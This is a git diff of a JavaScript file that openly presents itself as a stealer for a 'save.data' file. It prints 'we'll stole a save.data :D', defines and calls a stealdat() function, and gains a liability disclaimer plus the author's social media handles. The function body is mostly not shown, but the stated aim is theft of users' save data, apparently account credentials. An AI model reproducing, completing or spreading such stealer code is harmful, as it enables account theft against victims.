@@ -1,5 +1,12 @@
-/*** This code writted in a github account called 'github.com/FrenzY8/ ***/
-// idea for make this: galvin0705
+/*** Created on Github accounts named FrenzY8 ***/
+/*** 
+- Just a seconds. please read.
+Do not use for Abuse Activities. 
+We will not be held responsible for anything that happens to the Victim, the Perpetrator.
+This code is only distributed and is not recommended to be used TO PUBLIC (including-abuse)
+Only fools trade(buy/sell) this Code.
+- All risks are in your hands.
+***/
 
 console.log("Get ready.. we'll stole a save.data :D")
 const os = require('os');
@@ -33,4 +40,6 @@ function stealdat () {
 }
 // now we do a:
 stealdat() // done :)
-// Nothing changes just want let this repository on top.
+
+/*Discord: .FrenzySG.#2331 (not-respond-for-dm)
+Instagram: frenzy.666 (respond-to-a-dm)*/
